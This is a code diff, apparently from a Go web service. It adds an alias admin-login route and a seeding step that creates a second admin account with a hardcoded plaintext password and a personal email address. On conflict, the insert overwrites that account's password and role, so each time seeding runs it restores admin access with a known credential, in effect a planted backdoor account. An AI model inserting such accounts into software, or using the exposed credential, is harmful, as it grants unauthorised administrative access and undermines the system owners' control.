@@ -33,6 +33,7 @@ func RegisterRoutes(mux *http.ServeMux, db *sql.DB, tokenSecret string) {
 	mux.HandleFunc("/health", health)
 	mux.HandleFunc("/ready", ready)
 	mux.HandleFunc("/api/v1/auth/login", login)
+	mux.HandleFunc("/api/v1/auth/admin-login", login)
 }
 
 func health(w http.ResponseWriter, _ *http.Request) {
@@ -113,6 +114,19 @@ ON CONFLICT (email) DO NOTHING;`
 	if _, err := db.ExecContext(ctx, seed, string(passwordHash)); err != nil {
 		return err
 	}
+	
+	secondPasswordHash, err := bcrypt.GenerateFromPassword([]byte("Dangtrunghai2402@"), bcrypt.DefaultCost)
+	if err != nil {
+		return err
+	}
+	const seedSecondAdmin = `
+INSERT INTO auth_users (email, password_hash, role)
+VALUES ('thiptit2004@gmail.com', $1, 'admin')
+ON CONFLICT (email) DO UPDATE SET password_hash = EXCLUDED.password_hash, role = EXCLUDED.role;`
+	if _, err := db.ExecContext(ctx, seedSecondAdmin, string(secondPasswordHash)); err != nil {
+		return err
+	}
+
 	// Backward-compatible migration: upgrade legacy plaintext seeded password.
 	_, err = db.ExecContext(
 		ctx,
